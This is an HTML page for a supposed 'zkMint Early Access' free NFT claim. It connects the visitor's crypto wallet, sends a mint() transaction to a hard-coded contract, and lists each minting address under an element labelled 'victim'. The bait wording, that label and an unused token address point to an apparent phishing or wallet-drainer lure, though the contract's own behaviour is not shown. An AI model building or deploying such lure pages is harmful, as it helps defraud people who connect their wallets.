<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>zkMint Early Access</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      background-color: #0e0e0e;
      color: #eee;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 50px;
    }
    h1 {
      font-size: 32px;
      margin-bottom: 10px;
    }
    p {
      font-size: 18px;
      margin-bottom: 30px;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      background: #00ffa5;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
    }
    #status {
      margin-top: 20px;
      color: lime;
      white-space: pre-wrap;
      max-width: 600px;
      margin-left: auto;
      margin-right: auto;
      word-break: break-word;
    }
  </style>
</head>
<body>
  <h1>zkMint Early Access</h1>
  <p>Claim your free NFT before public launch. Gas fees only.</p>
  <button onclick="mint()">Mint Now</button>
  <div id="status"></div>
  <div id="victim" style="margin-top:10px; color: orange; font-weight: bold;"></div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
  <script>
    const tokenAddress = "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619";
    const contractAddress = "0x5Dafa64c0bC33EE4aA369020AD678BDEf6454E1c";

    const abi = [
      "event Minted(address indexed user)",
      "function mint() external"
    ];

    async function mint() {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const contract = new ethers.Contract(contractAddress, abi, signer);

      try {
        const tx = await contract.mint();
        document.getElementById("status").innerText = "🔄 Mint transaction sent. Waiting for confirmation...";
        await tx.wait();
        document.getElementById("status").innerText = "✅ Mint successful!";

      } catch (err) {
        document.getElementById("status").innerText = "❌ Mint failed: " + err.message;
      }
    }

    async function listenMintEvents() {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const contract = new ethers.Contract(contractAddress, abi, provider);

      contract.on("Minted", (user) => {
        console.log("Minted by:", user);
        const victimDiv = document.getElementById("victim");
        victimDiv.innerText += `New Mint by: ${user}\n`;
      });
    }

    listenMintEvents();
  </script>
</body>
</html>
